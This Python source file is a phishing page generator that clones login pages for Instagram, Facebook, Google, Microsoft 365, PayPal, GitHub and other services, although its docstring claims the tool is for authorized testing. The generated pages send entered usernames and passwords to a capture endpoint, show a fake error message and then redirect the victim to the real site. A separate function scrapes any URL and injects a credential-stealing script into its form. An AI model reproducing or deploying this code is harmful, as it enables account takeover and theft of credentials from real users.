"""
APEX Phishing Page Generator
Clones login pages for authorized social engineering tests.
Supports Instagram, Facebook, Google, Microsoft 365, and custom URLs.
"""
import requests
import os
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

TEMPLATES = {
    'instagram': {
        'name': 'Instagram',
        'url': 'https://www.instagram.com/accounts/login/',
        'logo': '📷',
        'color': '#E4405F'
    },
    'facebook': {
        'name': 'Facebook',
        'url': 'https://www.facebook.com/login.php',
        'logo': '📘',
        'color': '#1877F2'
    },
    'google': {
        'name': 'Google',
        'url': 'https://accounts.google.com/signin',
        'logo': '🔍',
        'color': '#4285F4'
    },
    'microsoft': {
        'name': 'Microsoft 365',
        'url': 'https://login.microsoftonline.com/',
        'logo': '🪟',
        'color': '#0078D4'
    },
    'twitter': {
        'name': 'Twitter/X',
        'url': 'https://twitter.com/login',
        'logo': '🐦',
        'color': '#1DA1F2'
    },
    'linkedin': {
        'name': 'LinkedIn',
        'url': 'https://www.linkedin.com/login',
        'logo': '💼',
        'color': '#0A66C2'
    },
    'netflix': {
        'name': 'Netflix',
        'url': 'https://www.netflix.com/login',
        'logo': '🎬',
        'color': '#E50914'
    },
    'paypal': {
        'name': 'PayPal',
        'url': 'https://www.paypal.com/signin',
        'logo': '💰',
        'color': '#003087'
    },
    'github': {
        'name': 'GitHub',
        'url': 'https://github.com/login',
        'logo': '🐙',
        'color': '#24292E'
    },
    'wordpress': {
        'name': 'WordPress',
        'url': '/wp-login.php',
        'logo': '📝',
        'color': '#21759B'
    }
}

def generate_phishing_page(template_name, custom_url=None, capture_endpoint='/capture'):
    """
    Generate a phishing page HTML
    
    Args:
        template_name: Name of template ('instagram', 'facebook', etc.) or 'custom'
        custom_url: URL to clone (for custom template)
        capture_endpoint: Endpoint to send captured credentials to
    
    Returns:
        HTML string of the phishing page
    """
    
    if template_name == 'custom' and custom_url:
        return clone_custom_page(custom_url, capture_endpoint)
    
    template = TEMPLATES.get(template_name)
    if not template:
        return None
    
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{template['name']} - Login</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }}
        .login-container {{
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .logo {{
            font-size: 48px;
            margin-bottom: 10px;
        }}
        .title {{
            font-size: 28px;
            font-weight: 600;
            color: {template['color']};
            margin-bottom: 30px;
            letter-spacing: 1px;
        }}
        .input-group {{
            margin-bottom: 12px;
        }}
        .input-group input {{
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
            background: #fafafa;
            outline: none;
            transition: border-color 0.2s;
        }}
        .input-group input:focus {{
            border-color: {template['color']};
        }}
        .login-btn {{
            width: 100%;
            padding: 12px;
            background: {template['color']};
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.2s;
        }}
        .login-btn:hover {{ opacity: 0.9; }}
        .divider {{
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }}
        .divider::before, .divider::after {{
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }}
        .divider span {{ margin: 0 15px; }}
        .forgot {{
            color: {template['color']};
            font-size: 13px;
            text-decoration: none;
            margin-top: 15px;
            display: block;
        }}
        .error-msg {{
            color: #ed4956;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">{template['logo']}</div>
        <div class="title">{template['name']}</div>
        
        <form id="loginForm" method="POST" action="{capture_endpoint}">
            <div class="input-group">
                <input type="text" name="username" placeholder="Email or username" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        
        <div class="divider"><span>OR</span></div>
        <a href="#" class="forgot">Forgot password?</a>
        <div class="error-msg" id="errorMsg">Invalid credentials. Please try again.</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            var formData = new FormData(this);
            
            fetch('{capture_endpoint}', {{
                method: 'POST',
                body: formData
            }})
            .then(function(response) {{
                // Show error to make it look real, then redirect
                document.getElementById('errorMsg').style.display = 'block';
                setTimeout(function() {{
                    window.location.href = '{template["url"]}';
                }}, 2000);
            }});
        }});
    </script>
</body>
</html>'''
    
    return html


def clone_custom_page(target_url, capture_endpoint='/capture'):
    """Clone a custom login page"""
    try:
        r = requests.get(target_url, timeout=10, verify=False,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Find the login form
        form = soup.find('form')
        if not form:
            return generate_phishing_page('google')
        
        # Modify form action
        form['action'] = capture_endpoint
        form['method'] = 'post'
        
        # Add credential capture script
        capture_script = soup.new_tag('script')
        capture_script.string = f'''
        document.querySelector('form').addEventListener('submit', function(e) {{
            e.preventDefault();
            var formData = new FormData(this);
            fetch('{capture_endpoint}', {{
                method: 'POST',
                body: formData
            }}).then(function() {{
                window.location.href = '{target_url}';
            }});
        }});
        '''
        soup.body.append(capture_script)
        
        return str(soup)
    except:
        return generate_phishing_page('google')


def save_phishing_page(html_content, filename='phishing_page.html'):
    """Save phishing page to file"""
    output_dir = 'data/phishing'
    os.makedirs(output_dir, exist_ok=True)
    
    filepath = os.path.join(output_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    return filepath


def list_templates():
    """List available phishing templates"""
    return [{'id': k, 'name': v['name'], 'logo': v['logo']} for k, v in TEMPLATES.items()]